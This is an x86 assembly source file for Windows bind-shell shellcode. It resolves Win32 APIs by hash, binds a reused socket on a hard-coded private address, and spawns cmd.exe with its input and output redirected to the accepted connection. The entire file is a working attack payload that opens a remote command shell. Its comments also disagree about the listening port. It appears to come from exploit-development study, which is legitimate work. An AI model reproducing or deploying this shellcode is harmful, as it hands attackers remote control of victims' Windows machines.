; Purpose: Use Win32 API to
;  - Rebind socket shellcode (http://phrack.org/issues/62/7.html)
;  - Establish a bind shell on port 192.168.199.134:4321
;
; Uses Stephen Fewer's Block API hashing
;  https://raw.githubusercontent.com/rapid7/metasploit-framework/master/external/source/shellcode/windows/x86/src/block/block_api.asm

[BITS 32]

cld
call start

; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.

api_call:
  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp               ; Create a new stack frame
  xor edx, edx               ; Zero EDX
  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB
  mov edx, [edx+0xc]         ; Get PEB->Ldr
  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list

next_mod:                    ;
  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check
  xor edi, edi               ; Clear EDI which will store the hash of the module name

loop_modname:                ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the name
  cmp al, 'a'                ; Some versions of Windows use lower case module names
  jl not_lowercase           ;
  sub al, 0x20               ; If so normalise to uppercase

not_lowercase:               ;
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  dec ecx
  jnz loop_modname           ; Loop until we have read enough
  ; We now have the module hash computed
  push edx                   ; Save the current position in the module list for later
  push edi                   ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+0x10]        ; Get this modules base address
  mov eax, [edx+0x3c]        ; Get PE header
  add eax, edx               ; Add the modules base address
  mov eax, [eax+0x78]        ; Get export tables RVA
  test eax, eax              ; Test if no export address table is present
  jz get_next_mod1           ; If no EAT present, process the next module
  add eax, edx               ; Add the modules base address
  push eax                   ; Save the current modules EAT
  mov ecx, [eax+0x18]        ; Get the number of function names
  mov ebx, [eax+0x20]        ; Get the rva of the function names
  add ebx, edx               ; Add the modules base address

; Computing the module hash + function hash
get_next_func:               ;
  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below
  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                    ; Decrement the function name counter
  mov esi, [ebx+ecx*4]       ; Get rva of next module name
  add esi, edx               ; Add the modules base address
  xor edi, edi               ; Clear EDI which will store the hash of the function name

; And compare it to the one we want
loop_funcname:               ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the ASCII function name
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname          ; If we have not reached the null terminator, continue
  add edi, [ebp-8]           ; Add the current module hash to the function hash
  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for
  jnz get_next_func          ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                    ; Restore the current modules EAT
  mov ebx, [eax+0x24]        ; Get the ordinal table rva
  add ebx, edx               ; Add the modules base address
  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal
  mov ebx, [eax+0x1c]        ; Get the function addresses table rva
  add ebx, edx               ; Add the modules base address
  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA
  add eax, edx               ; Add the modules base address to get the functions actual VA

; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                    ; Clear off the current modules hash
  pop ebx                    ; Clear off the current position in the module list
  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                    ; Pop off the origional return address our caller will have pushed
  pop edx                    ; Pop off the hash value our caller will have pushed
  push ecx                   ; Push back the correct return value
  jmp eax                    ; Jump into the required function

; We now automagically return to the correct caller...
get_next_mod:                ;
  pop eax                    ; Pop off the current (now the previous) modules EAT

get_next_mod1:               ;
  pop edi                    ; Pop off the current (now the previous) modules hash
  pop edx                    ; Restore our position in the module list
  mov edx, [edx]             ; Get the next module
  jmp next_mod               ; Process this module

;
; Begin Bind Shell Shellcode
;

start:
  pop ebp                    ; pop off the address of 'api_call' for calling later

  ; WSAStartup() - initiates use of the Winsock DLL by a process
  xor eax, eax
  mov ax, 0x0190      ; sizeof (struct WSAData)
  sub esp, eax        ; allocate space for WSAData struct
  push esp            ; push pointer to WSAData struct
  push eax            ; push the version parameter
  push 0x006B8029     ; hash of ws2_32.dll!WSAStartup
  call ebp

  ; sleep for 30 seconds
  xor eax, eax        ; zero out eax
  push eax            ; bAlertable (False)
  mov ax, 0x7530      ; move 30 seconds (30,000 ms) into AX
  push eax            ; dwMilliseconds (30,000 mx)
  push 0xE035F044     ; hash of kernel32.dll!Sleep
  call ebp

  ; setup WS2_32.WSASocketA
  xor eax, eax        ; zero out eax
  push eax
  push eax	      ; dwFlags
  push eax	      ; g (group)
  push eax 	      ; lpProtocolInfo
  mov al, 6           ; put value 6 for IPPROTO_TCP
  push eax            ; protocol, if 0 the service provider will choose protocol
  mov al, 1           ; put value 1 for SOCK_STREAM
  push eax            ; push value on stack
  inc eax             ; make value 2 for AF_INET
  push eax            ; push value on stack
  push 0xE0DF0FEA     ; hash of ws2_32.dll!WSASocketA
  call ebp            ; call WSASocketA
  mov edi, eax        ; store returned socket in edi

  ; Setup setsockopt function to reuse socket
  ; https://www.sockets.com/winsock.htm#WinsockH
  push 0x2           ; optval non-zero because SO_REUSEADDR is boolean
  mov eax, esp
  push 0x4	     ; optlen (size of SO_REUSEADDR value)
  push eax	     ; *optval (pointer)
  push 0x4           ; optname (#define SO_REUSEADDR    0x0004)
  push 0xFFFF        ; leveli (#define SOL_SOCKET      0xffff)
  push edi	     ; socket 
  push 0x2977A2F1    ; hash of ws2_32.dll!setsockop
  call ebp

  ; Setup sockaddr struct
  xor eax, eax
  push eax           ; INADDR_ANY
  push 0x86c7a8c0    ; sockaddr.sin_addr 192.168.199.134 
  push word 0x0F27   ; sockaddr.sin_port  9999
  add al, 2          ; sockaddr.sin_family AF_INET = 2
  push word ax       ; push ipv4 AF onto stack
  mov edx, esp	     ; save address of sockaddr_in struct onto stack

  ; Setup WS2_32.bind
  push byte 16       	; length
  push edx           	; pointer to s
  push edi           	; saved socket
  push 0x6737DBC2       ; hash of ws2_32.dll!bind
  call ebp

  ; Setup WS2_32.listen
  xor eax, eax
  push eax	       ; backlog is used for mulitple connections.  Only need one so set to zero
  push edi             ; saved socket
  push 0xFF38E9B7      ; hash of ws2_32.dll!listen
  call ebp

  ; setup WS2_32.accept
  xor eax, eax            ; zero out eax
  push eax                ; Optional pointer to addr length
  push eax                ; Optional pointer to addr
  push edi                ; push saved socket
  push 0xE13BEC74         ; ws2_32.dll!accept
  call ebp
  mov esi, eax            ; save the socket from the accept call

  ; Close the listening socket
  xor eax, eax
  push edi		; push the listening socket 
  push 0x614D6E75       ; ws2_32.dll!closesocket
  call ebp
  
  ; setup pointer to cmd
  mov edx, 0x646d6363	; cmdd
  shr edx, 8		; cmd
  push edx		; push edx onto the stack
  mov ebx, esp		; point to "cmd"

  ; setup pointer to processinfo
  xor edx, edx
  xor ecx, ecx  	; clear out ecx
  mov cl, 0x04 
  loop1:
    push edx
  loop loop1
  mov edi, esp		; move pointer into ebx

  ; setup startupinfo 
  push esi		; hStdError - saved socket
  push esi		; hStdOutput - saved socket
  push esi		; hStdInput -saved socket
  push edx		; pReserved2 - NULL	
  push edx		; cbReserved2 -NULL
  xor eax, eax
  inc eax
  rol eax, 0x08			
  inc eax
  push eax		; dwFlags - STARTF_USESTDHANDLES 0x00000101
  push edx		; dwFillAttribute - NULL
  push edx		; dwYCountChars - NULL
  push edx		; dwXCountChars - NULL
  push edx		; dwYSize - NULL
  push edx		; dwXSize - NULL
  push edx		; dwY - NULL
  push edx		; dwX - NULL
  push edx		; pTitle - NULL
  push edx		; pDesktop - NULL
  push edx		; pReserved - NULL
  xor eax, eax
  add al, 0x44		; sizeof STARTUP_INFO
  push eax		; cb - size of structure
  mov eax, esp		; pStartupInfo

  ; CreateProcessA() 
  push edi		; pProcessInfo
  push eax		; pStartupInfo
  push edx		; CurrentDirectory - NULL
  push edx		; pEnvironment - NULL
  push edx		; CreationFlags - 0
  xor eax, eax
  inc eax
  push eax		; InheritHandles -TRUE - 1
  push edx		; pThreadAttributes -NULL
  push edx		; pProcessAttributes - NULL
  push ebx		; pCommandLine - pointer to "cmd"
  push edx		; ApplicationName - NULL
  push 0x863FCC79       ; hash of kernel32.dll!CreateProcessA
  call ebp

  ; WaitForSingleObject
  push edx  		; time to wait - 0=don't enter wait state
  push dword [edi]	; pProcessInfo (process handle)
  push 0x601D8708       ; hash of kernel32.dll!WaitForSingleObject
  call ebp

  ; Exit
  xor eax, eax
  push eax
  push 0x56A2B5F0	; hash of kernel32.dll!ExitProcess
  call ebp
